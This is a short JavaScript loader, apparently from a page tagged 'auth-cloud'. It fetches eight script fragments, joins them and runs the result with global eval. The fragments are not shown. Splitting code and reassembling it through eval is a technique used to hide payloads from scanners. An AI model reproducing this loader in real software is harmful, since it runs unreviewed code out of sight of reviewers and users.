(async function(){
  try{
    const n=8;
    const parts=await Promise.all(Array.from({length:n},(_,i)=>fetch('r'+i+'.js?v=20',{cache:'no-store'}).then(r=>{
      if(!r.ok)throw new Error('r'+i);
      return r.text();
    }));
    (0,eval)(parts.join(''));
  }catch(e){console.error('auth-cloud',e)}
})();
